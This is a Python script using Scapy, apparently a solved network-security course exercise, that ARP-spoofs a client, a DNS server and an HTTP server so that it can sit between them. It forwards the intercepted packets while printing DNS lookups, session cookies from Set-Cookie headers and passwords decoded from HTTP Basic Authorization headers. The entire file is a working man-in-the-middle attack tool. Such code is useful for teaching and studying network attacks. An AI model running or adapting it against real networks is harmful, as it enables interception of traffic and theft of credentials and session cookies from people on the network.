from scapy.all import *
from scapy.layers.http import HTTPResponse, HTTPRequest # import HTTP packet
from base64 import b64decode

import argparse
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=IP), timeout=3, verbose=0)
    if ans:
        print("# IP: ", IP, " maps to MAC: ", ans[0][1].src)
        return ans[0][1].src
    print("# No mac found")
    return


#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # TODO: Spoof httpServer ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # TODO: Spoof dnsServer ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    arp_response = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op=2)
    send(arp_response, verbose=False)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    arp_response = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op=2)
    send(arp_response, verbose=False)


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    valid_ips_to_mac = {
                clientIP: clientMAC,
                httpServerIP: httpServerMAC,
                dnsServerIP: dnsServerMAC,
                attackerIP: attackerMAC
            }

    if IP in packet:
        ip_src=packet[IP].src
        ip_dst=packet[IP].dst

        if DNS in packet and ip_src == clientIP and ip_dst == dnsServerIP:
            print("*hostname:", packet[DNS].qd.qname.decode('utf-8'))

        if DNS in packet and ip_src == dnsServerIP and ip_dst == clientIP:
            print("*hostaddr:", packet[DNS].an.rdata)
        
        if HTTPResponse in packet and ip_src == httpServerIP and ip_dst == clientIP:
            print("*cookie:", packet[HTTPResponse].Set_Cookie.decode('utf-8'))

        if HTTPRequest in packet and ip_dst == httpServerIP:
            auth = packet[HTTPRequest].Authorization
            _, passw = b64decode(auth.split(None, 1)[1]).decode('utf-8').split(':', 1)
            print("*basicauth:", passw)

        if ip_src in valid_ips_to_mac and ip_dst in valid_ips_to_mac and packet[Ether].src != attackerMAC:
            packet[Ether].src = attackerMAC
            packet[Ether].dst = valid_ips_to_mac[ip_dst]
            del packet.chksum
            sendp(packet)


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)
    print("# Attacker mac address: ", attackerMAC)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
